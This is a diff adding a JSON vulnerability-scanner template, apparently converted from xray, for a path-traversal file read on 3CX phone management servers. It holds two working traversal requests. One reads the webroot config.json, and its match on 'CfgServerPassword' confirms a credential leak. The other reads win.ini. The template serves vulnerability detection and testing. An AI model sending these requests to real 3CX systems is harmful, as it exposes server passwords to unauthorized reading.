@@ -1,0 +1,96 @@
+{
+  "name": "poc-yaml-3cx-smc-file-read",
+  "author": "k3ppf0r",
+  "description": "",
+  "references": [
+    "https://medium.com/@frycos/pwning-3cx-phone-management-backends-from-the-internet-d0096339dd88"
+  ],
+  "version": "",
+  "protocol": "http",
+  "selfContained": false,
+  "flow": "config() || windows()",
+  "searchQueries": {},
+  "payloads": {},
+  "verifySteps": [
+    {
+      "stepId": "config",
+      "method": "GET",
+      "path": "/Electron/download/windows/..\\..\\..\\Http\\webroot\\config.json",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": true,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "response.status \u003d\u003d 200 \u0026\u0026 \"CfgServerPassword\".bmatches(response.body)"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    },
+    {
+      "stepId": "windows",
+      "method": "GET",
+      "path": "/Electron/download/windows/\\windows\\win.ini",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": true,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "response.status \u003d\u003d 200 \u0026\u0026 response.body_string.contains(\"for 16-bit app support\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalFormat": "xray"
+}
